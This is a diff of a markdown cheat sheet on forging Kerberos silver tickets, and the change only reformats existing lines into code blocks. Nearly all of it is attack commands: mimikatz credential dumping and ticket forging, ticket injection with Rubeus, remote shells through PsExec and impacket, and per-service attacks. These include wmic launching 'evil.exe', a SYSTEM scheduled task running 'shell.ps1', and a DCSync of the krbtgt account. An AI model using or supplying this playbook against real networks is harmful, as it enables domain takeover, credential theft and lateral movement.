@@ -2,55 +2,72 @@
 
 ### Forging a Service Ticket (ST) require machine account password (key) or NT hash of the service account.
 
-#### 1) mimikatz.exe
+#### 1) 
 
-#### 2) privilege::debug
+    mimikatz.exe
 
-#### 3) lsadump::lsa /inject /name:SERVICE/DOMAIN ADMIN
+#### 2) 
+    privilege::debug
+
+#### 3) 
+
+    lsadump::lsa /inject /name:SERVICE/DOMAIN ADMIN
 
 ### 1) Create a ticket for the service
 
- - mimikatz $ kerberos::golden /user:USERNAME /domain:DOMAIN.FQDN /sid:DOMAIN-SID /target:
+    mimikatz $ kerberos::golden /user:USERNAME /domain:DOMAIN.FQDN /sid:DOMAIN-SID /target:
 
- - mimikatz $ kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-134912914
+    mimikatz $ kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-134912914
 
 ### 2) Use same steps as a golden ticket
 
- - mimikatz.exe "kerberos::golden /domain:DOMAIN /sid:DOMAIN_SID /rc4:HASH /user:USER /service:SERVICE /target:TARGET"
+    mimikatz.exe "kerberos::golden /domain:DOMAIN /sid:DOMAIN_SID /rc4:HASH /user:USER /service:SERVICE /target:TARGET"
 
 ### Inject the ticket
 
- - mimikatz.exe "kerberos::ptt TICKET_FILE"
+    mimikatz.exe "kerberos::ptt TICKET_FILE"
 
- - .\Rubeus.exe ptt /ticket:TICKET_FILE
+    .\Rubeus.exe ptt /ticket:TICKET_FILE
 
 ### Obtain a shell
 
- - .\PsExec.exe -accepteula \\TARGET cmd
+    .\PsExec.exe -accepteula \\TARGET cmd
 
 ## Silver Ticket on Linux
 
- - python ticketer.py -nthash HASH -domain-sid DOMAIN_SID -domain DOMAIN -spn SERVICE_PRINCIPAL_NAME USER
+    python ticketer.py -nthash HASH -domain-sid DOMAIN_SID -domain DOMAIN -spn SERVICE_PRINCIPAL_NAME USER
 
- - export KRB5CCNAME=/root/impacket-examples/TICKET_NAME.ccache 
+    export KRB5CCNAME=/root/impacket-examples/TICKET_NAME.ccache 
 
- - python psexec.py DOMAIN/USER@TARGET -k -no-pass
+    python psexec.py DOMAIN/USER@TARGET -k -no-pass
 
 ## Services to target with a Silver Ticket
 
 ### Service Type --> Service Silver Tickets --> Attack
 
-#### 1) WMI --> HOST + RPCSS --> wmic.exe /authority:"kerberos:DOMAIN\DC01" /node:"DC01" process call create "cmd /c evil.exe"
+#### 1) WMI --> HOST + RPCSS --> 
 
-#### 2) Powershell Remoting --> CIFS + HTTP + (wsman?) --> New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC
+    wmic.exe /authority:"kerberos:DOMAIN\DC01" /node:"DC01" process call create "cmd /c evil.exe"
 
-#### 3) WinRM --> HTTP+ wsman --> New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC
+#### 2) Powershell Remoting --> CIFS + HTTP + (wsman?) --> 
 
-#### 4) Scheduled Tasks --> HOST --> schtasks /create /s dc01 /SC WEEKLY /RU "NT Authority\System" /IN "SCOM Agent Health Check" /IR "C:/shell.ps1"
+    New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC
 
-#### 5) Windows File Share (CIFS) --> CIFS --> dir \\dc01\c$
+#### 3) WinRM --> HTTP+ wsman --> 
 
-#### 6) LDAP operations including Mimikatz DCSync --> LDAP --> lsadump::dcsync /dc:dc01 /domain:domain.local /user:krbtgt
+    New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC
+
+#### 4) Scheduled Tasks --> HOST --> 
+
+    schtasks /create /s dc01 /SC WEEKLY /RU "NT Authority\System" /IN "SCOM Agent Health Check" /IR "C:/shell.ps1"
+
+#### 5) Windows File Share (CIFS) --> CIFS --> 
+
+    dir \\dc01\c$
+
+#### 6) LDAP operations including Mimikatz DCSync --> LDAP --> 
+
+    lsadump::dcsync /dc:dc01 /domain:domain.local /user:krbtgt
 
 #### 7) Windows Remote Server Administration Tools (RSAT) --> RPCSS + LDAP + CIFS --> /
 
